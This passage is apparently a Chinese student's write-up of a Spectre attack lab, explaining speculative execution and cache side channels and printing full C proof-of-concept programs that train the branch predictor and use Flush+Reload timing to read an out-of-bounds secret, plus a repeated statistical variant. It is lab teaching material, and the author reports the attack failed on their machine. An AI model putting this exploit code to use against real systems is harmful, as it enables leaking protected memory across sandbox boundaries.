<li>在上述代码示例中，在微架构层面，第2行涉及两个操作：从内存加载size的值，并将其与x进行比较。如果size不在CPU缓存中，可能需要数百个CPU时钟周期才能读取该值。现代CPU不会闲置，而是尝试预测比较的结果，并根据估计进行分支的猜测执行。由于这样的执行开始于比较完成之前，所以称为乱序执行。在进行乱序执行之前，CPU会存储其当前状态和寄存器的值。当size的值最终到达时，CPU将检查实际的结果。如果预测是正确的，就会提交这种猜测执行，并获得显著的性能提升。如果预测是错误的，CPU将恢复到保存的状态，因此乱序执行产生的所有结果都将被丢弃，就好像从未发生过一样。这就是为什么从外部看，我们认为第3行从未执行过。</li>
<li>英特尔和几家CPU制造商在无序执行的设计上犯了一个严重的错误。如果不应该发生这样的执行，它们将消除无序执行对寄存器和内存的影响，因此执行不会导致任何可见的影响。然而，他们忘记了一件事，即对CPU缓存的影响。在无序执行期间，引用的内存被提取到寄存器中，也存储在缓存中。如果必须丢弃无序执行的结果，那么也应该丢弃由该执行引起的缓存。不幸的是，但在大多数cpu中，情况并非如此。因此，它产生了一个可观察到的效果。使用任务1和任务2中描述的侧通道技术，我们可以观察到这种效果。幽灵党的攻击巧妙地利用这种可观察到的效果来找出受保护的秘密价值。<br><a name="bxytC"></a></li>
</ul>
<h3 id="4-2-The-Experiment"><a href="#4-2-The-Experiment" class="headerlink" title="4.2 The Experiment"></a><strong>4.2 The Experiment</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (150)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">        time1 = __rdtscp(&amp;junk);</span><br><span class="line">        junk = *addr;</span><br><span class="line">        time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">        <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d.\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">victim</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; size) &#123;  </span><br><span class="line">        temp = <span class="built_in">array</span>[x * <span class="number">4096</span> + DELTA];  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// FLUSH the probing array</span></span><br><span class="line">    flushSideChannel();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Train the CPU to take the true branch inside victim()</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;   </span><br><span class="line">        victim(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Exploit the out-of-order execution</span></span><br><span class="line">    _mm_clflush(&amp;size);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); </span><br><span class="line">    victim(<span class="number">97</span>);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// RELOAD the probing array</span></span><br><span class="line">    reloadSideChannel();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这里重要的一点是，如果想让分支进入一个指定的路径，我们需要训练CPU，这样我们指定的一个分支就会变成预测的结果</li>
<li>如果把下面这行语句注释掉，重新执行，会无法找出秘密值：</li>
<li>_mm_clflush(&amp;size);</li>
<li>执行这行语句是为了确保没有被CPU缓存</li>
<li>上面这行不注释，victim(i)改成victim(i+20)，也会失败，因为这样把CPU训练成不执行分支了<br><a name="cdRMd"></a></li>
</ul>
<h3 id="4-3-Task-3"><a href="#4-3-Task-3" class="headerlink" title="4.3 Task 3"></a><strong>4.3 Task 3</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreExperiment SpectreExperiment.c</span><br></pre></td></tr></table></figure>
<p>同理，不知是否是硬件原因，无法找出秘密值<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475073401-dad6ed0a-b4bf-486f-8350-815abf4f8177.png#averageHue=%23080605&clientId=uf8fdb3e2-6fa1-4&from=paste&height=365&id=ua5c701b9&originHeight=575&originWidth=1047&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=132452&status=done&style=none&taskId=u82efbab1-98e0-4468-a2d8-d96132f4bc3&title=&width=664.7619349507802" alt="image.png"><br><a name="gFmvK"></a></p>
<h2 id="5-Task-4-The-Spectre-Attack"><a href="#5-Task-4-The-Spectre-Attack" class="headerlink" title="5 Task 4: The Spectre Attack"></a><strong>5 Task 4: The Spectre Attack</strong></h2><p><a name="Gka7H"></a></p>
<h3 id="5-1-The-Setup-for-the-Experiment"><a href="#5-1-The-Setup-for-the-Experiment" class="headerlink" title="5.1 The Setup for the Experiment"></a><strong>5.1 The Setup for the Experiment</strong></h3><ul>
<li>利用分支预测可以获取秘密值，秘密值可能是不同进程的数据，那是用硬件隔离机制来保护的。如果是同一个进程的数据， 往往利用软件的沙盒机制。获取不同进程的数据难度高很多，这里是演示在同一个进程中获取数据。</li>
<li>浏览器中不同页面是用不同沙盒隔离开的，幽灵漏洞可以获取另一个页面的数据。<br />SpectreAttack.c如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">char</span>    *secret    = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> junk=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside restrictedAccess().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123; </span><br><span class="line">      restrictedAccess(i); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;   &#125;</span><br><span class="line">  <span class="comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span></span><br><span class="line">  s = restrictedAccess(index_beyond);  </span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret: %p \n&quot;</span>, secret);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;buffer: %p \n&quot;</span>, buffer);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond);</span><br><span class="line">  spectreAttack(index_beyond);</span><br><span class="line">  reloadSideChannel();</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a name="Wzmse"></a></li>
</ul>
<h3 id="5-2-The-Program-Used-in-the-Experiment"><a href="#5-2-The-Program-Used-in-the-Experiment" class="headerlink" title="5.2 The Program Used in the Experiment"></a><strong>5.2 The Program Used in the Experiment</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreAttack SpectreAttack.c</span><br></pre></td></tr></table></figure>
<p>尝试了很多次，结果没有变化，无法打印出秘密值：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702524260152-b415476b-a4a8-4bd0-8629-e4836c310a8b.png#averageHue=%230f0c0a&clientId=u4568489d-13ea-4&from=paste&height=392&id=u6dd8ea2c&originHeight=618&originWidth=1062&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=184990&status=done&style=none&taskId=u60ed6623-e87f-48a5-b150-dff7f49cc67&title=&width=674.2857449070951" alt="image.png"><br />隐藏标题栏<br><a name="Dcffw"></a></p>
<h2 id="6-Task-5-Improve-the-Attack-Accuracy"><a href="#6-Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="**6 Task 5: Improve the Attack Accuracy **"></a>**6 Task 5: Improve the Attack Accuracy **</h2><ul>
<li><p>在之前的任务中，可以观察到结果确实有一些噪声，而且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，期望在稍后使用，或者阈值不是很准确。缓存中的这个噪声会影响我们的攻击结果。我们需要多次执行攻击；我们可以使用以下代码来自动执行任务，而不是手动执行。我们基本上使用了一种统计技术。这个想法是创建一个大小为256的分数数组，每个可能的秘密值都有一个元素。然后，我们会多次进行攻击。每次，如果我们的攻击程序说k是秘密（这个结果可能是假的），我们加k。在多次攻击后，我们使用得分最高的值k作为对秘密的最终估计。这将产生一个比基于一次运行更可靠的估计。修改后的代码如下图所示:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_lower = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bound_upper = <span class="number">9</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp    = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span>    *secret = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> index_beyond)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;bound_upper);</span><br><span class="line">  _mm_clflush(&amp;bound_lower); </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++)  &#123;  &#125;</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  s = restrictedAccess(index_beyond);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="type">size_t</span> index_beyond = (<span class="type">size_t</span>)(secret - (<span class="type">char</span>*)buffer);</span><br><span class="line"></span><br><span class="line">  flushSideChannel();</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*****\n&quot;</span>);  <span class="comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span></span><br><span class="line">    spectreAttack(index_beyond);</span><br><span class="line">    usleep(<span class="number">10</span>);</span><br><span class="line">    reloadSideChannelImproved();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(scores[max] &lt; scores[i]) max = i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);</span><br><span class="line">  <span class="built_in">printf</span>(<span 